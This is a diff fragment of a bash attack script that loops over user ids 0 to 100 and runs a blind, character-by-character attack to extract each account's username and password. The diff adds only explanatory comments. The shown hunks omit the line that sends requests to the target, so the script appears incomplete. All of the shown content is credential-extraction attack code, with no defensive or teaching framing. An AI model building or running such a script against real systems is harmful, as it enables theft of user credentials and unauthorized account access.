@@ -3,6 +3,8 @@
 for id in {0..100};
 do
 	dump=""
+
+	# find out username length
 	username_len=0
 	for (( ; ;))
 	do
@@ -22,6 +24,7 @@ do
 		fi
 	done
 
+	# find out password length
 	password_len=0
 	for (( ; ;))
 	do
@@ -42,6 +45,7 @@ do
 	done
 	dump="$dump\nid=$id; username_len=$username_len; password_len=$password_len"
 	
+	# blind attack on username
 	username=""
 	for ((pos = 1; pos<=username_len; pos++));
 	do
@@ -50,6 +54,7 @@ do
 			x=$(printf '%x' $c)
 			x=$(printf "\\x$x")
 			
+			# exception char: \
 			if [ $c -eq 92 ];
 			then
 				x="\\$x"
@@ -70,6 +75,7 @@ do
 	done
 	dump="$dump\nusername: $username"
 
+	# blind attack on password
 	password=""
 	for ((pos = 1; pos<=password_len; pos++));
 	do
@@ -78,6 +84,7 @@ do
 			x=$(printf '%x' $c)
 			x=$(printf "\\x$x")
 			
+			# exception char: \
 			if [ $c -eq 92 ];
 			then
 				x="\\$x"
